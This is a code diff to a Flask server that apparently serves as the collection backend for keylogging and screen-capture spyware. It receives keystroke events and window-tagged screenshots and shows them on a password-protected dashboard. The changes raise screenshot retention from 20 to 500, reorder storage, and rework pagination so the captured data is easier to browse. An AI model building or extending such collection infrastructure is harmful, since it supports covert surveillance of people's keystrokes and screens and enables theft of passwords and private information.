@@ -9,7 +9,7 @@ app.secret_key = os.environ.get("SECRET_KEY", "change-this-in-production")
 
 # ── In-memory stores ──────────────────────────
 MAX_EVENTS      = 1000
-MAX_SCREENSHOTS = 20
+MAX_SCREENSHOTS = 500
 
 events      = deque(maxlen=MAX_EVENTS)
 screenshots = deque(maxlen=MAX_SCREENSHOTS)
@@ -56,7 +56,7 @@ def receive_log():
         "key":         data.get("key", ""),
         "received_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
     }
-    events.appendleft(entry)
+    events.append(entry)
     return jsonify({"status": "ok"}), 200
 
 
@@ -70,7 +70,7 @@ def receive_screenshot():
         "window":    data.get("window", "Unknown"),
         "image":     data["image"],
     }
-    screenshots.appendleft(entry)
+    screenshots.append(entry)
     return jsonify({"status": "ok"}), 200
 
 
@@ -105,21 +105,28 @@ def dashboard():
 def api_events():
     page     = int(request.args.get("page", 1))
     per_page = 50
-    all_ev   = list(events)
-    start    = (page - 1) * per_page
+    all_ev   = list(events)           # oldest first (appendleft removed)
+    total    = len(all_ev)
+    pages    = max(1, -(-total // per_page))  # ceil division
+    # Latest page shown first — page 1 = most recent events, oldest within page at top
+    # Reverse so page 1 = last 50, but within those 50 oldest is on top
+    reversed_ev = list(reversed(all_ev))
+    start = (page - 1) * per_page
+    page_events = list(reversed(reversed_ev[start:start + per_page]))  # oldest-first within page
     return jsonify({
-        "events":   all_ev[start:start + per_page],
-        "total":    len(all_ev),
+        "events":   page_events,
+        "total":    total,
         "page":     page,
         "per_page": per_page,
+        "pages":    pages,
     })
 
 @app.route("/api/screenshots")
 @login_required
 def api_screenshots():
-    limit = int(request.args.get("limit", 20))
+    # Return all screenshots oldest first
     return jsonify({
-        "screenshots": list(screenshots)[:limit],
+        "screenshots": list(screenshots),
         "total":       len(screenshots),
     })
 
